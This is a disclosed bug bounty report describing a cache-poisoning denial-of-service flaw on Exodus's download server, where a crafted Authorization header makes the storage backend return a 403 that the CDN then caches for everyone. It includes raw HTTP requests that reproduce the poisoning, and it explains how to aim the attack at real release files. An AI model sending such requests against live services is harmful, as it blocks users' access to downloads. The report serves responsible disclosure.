---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/uncontrolled-resource-consumption
  - env/web
  - vuln/dos
substate: "resolved"
weakness: "Uncontrolled Resource Consumption"
enriched: true
body: true
date: 2021-12-22
submitted: 2021-04-23T11:38:15.900Z
bounty_usd: null
votes: 110
cve: []
program: "[[programs/exodus|Exodus]]"
reporter: "youstin"
source: "https://hackerone.com/reports/1173153"
title: "Cache Poisoning DoS on downloads.exodus.com"
---
# Cache Poisoning DoS on downloads.exodus.com

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 110 | **Program:** Exodus | **Disclosed:** 2021-12-22

- Report: [https://hackerone.com/reports/1173153](https://hackerone.com/reports/1173153)
- CWE: Uncontrolled Resource Consumption
- Submitted: 2021-04-23T11:38:15.900Z

## Report summary

For more details about the vulnerability, check out:
https://youst.in/posts/cache-poisoning-at-scale/

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
Hello,

The subdomain downloads.exodus.com hosts all files meant to be downloaded by exodus users. A few of the file I found are:

```
https://downloads.exodus.com/releases/exodus-linux-x64-21.4.9.zip
https://downloads.exodus.com/releases/hashes-exodus-21.2.12.txt
https://downloads.exodus.com/releases/exodus-macos-21.3.29.dmg
```

The files are hosted on a azure storage host and are cached by Cloudflare.
A crafted Authorization header causes a 403 on the azure storage host, which is cached by cloudflare and passed to all other users accessing the source. 

### Disclaimer:
No actual denial of service attack was caused troughout my testing. All the testing used cache-busters, meaning it did not affect the live website in any way.

## Steps To Reproduce:

1. Send the following request to poison the cache:
```http
GET /releases/hashes-exodus-21.2.12.txt?cachebuster=hackerone HTTP/1.1
Host: downloads.exodus.com
Authorization: SharedKeyLite myaccount:ctzMq410TV3wS7upTBcunJTDLEJwMAZuFPfr0mrrA08=  

```
Notice you will get a 403. 

2. The cache is now poisoned so sending a request without the header or visiting the poisoned url in a browser will show you the cached 403. 
```
```http
GET /releases/hashes-exodus-21.2.12.txt?cachebuster=hackerone HTTP/1.1
Host: downloads.exodus.com

```
Will show the same 403 response. 

## Supporting Material/References:

Video PoC:

████████

## Impact

The steps that were used to take down a reosurce including a random parameter as a cache-buster can also be reproduced on the actual files when their cache is about to expire.  This will cause a DoS, restricting users from downloading or accessing the files hosted on downloads.exodus.com.

## Timeline

- **Report Filed**
- **2021-04-23** @jensec: HI @youstin ,

Thank you for the report. We are taking a look now. 

-Jenish
- **Report Severity Updated**
- **Report Triaged**
- **Report Needs More Info**
- **Report New**
- **Report Severity Updated**
- **Bounty Awarded**
- **Report Resolved**
- **2021-04-23** @youstin: Thanks for the bonus and the great response time! I will take a deeper look at the program and see if I can find anything else! :D
- **2021-12-01** @youstin: Hi,

I've been working on a write-up documenting multiple cache poisoning techniques and was wondering if we could disclose this report. If everything is fine on your side, please request disclosure so that I can disclose the report when my write-up is ready.

Thanks a lot, 
Youstin.
- **Agreed On Going Public**
- **2021-12-01** @youstin: Great, thanks a lot!
I forgot to mention, could we please make the video PoC internal only?
- **2021-12-01** @jensec: @youstin Done!
- **Agreed On Going Public**
- **Report Became Public**
